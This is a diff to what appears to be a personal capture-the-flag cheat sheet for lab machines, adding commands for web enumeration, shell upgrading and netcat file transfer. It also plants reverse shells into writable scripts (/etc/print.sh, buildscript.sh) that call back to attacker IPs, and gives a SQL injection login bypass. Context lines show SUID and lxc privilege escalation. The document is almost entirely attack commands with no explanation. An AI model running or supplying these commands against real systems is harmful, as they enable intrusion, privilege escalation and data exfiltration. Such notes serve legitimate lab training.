@@ -18,6 +18,8 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://enterpriz
 
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.enterprize.thm" -u http://10.10.162.26/ -fs 85 -o info/log_fuff_subdomains.txt
 
+dirb http://10.10.76.169 -N 403,404,400 | grep 200
+
 
 
 ### get header
@@ -102,6 +104,7 @@ find / -type f -user root -perm -4000 2>/dev/null
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 cat /root/root.txt
 
+python -c 'import pty; pty.spawn("/bin/sh")'
 
 ### server command
 sudo -l
@@ -167,5 +170,34 @@ lxc start ignite
 lxc exec ignite /bin/sh
 whoami
 
+
+### read wireshark file
+strings suspicious.pcapng
+
+
+### download file with netcat
+download suspicious.pcapng
+nc -l -p 1234 > suspicious.pcapng
+nc -w 3 10.2.8.75 1234 < suspicious.pcapng
+
+
+### tool read programs run without root
+pspy32
+
+
+### write to file for netcat
+echo 'bash -c "bash -i >& /dev/tcp/10.2.8.75/8080 0>&1"' > /etc/print.sh
+
+nc -lnvp 8080
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.64.179 1234 >/tmp/f" > downloads/src/buildscript.sh
+
+sudo python3 -m http.server 80
+
+nc -lvnp 1234
+
+
+### SQLi login vuln
+' OR 1=1 -- -
 
 
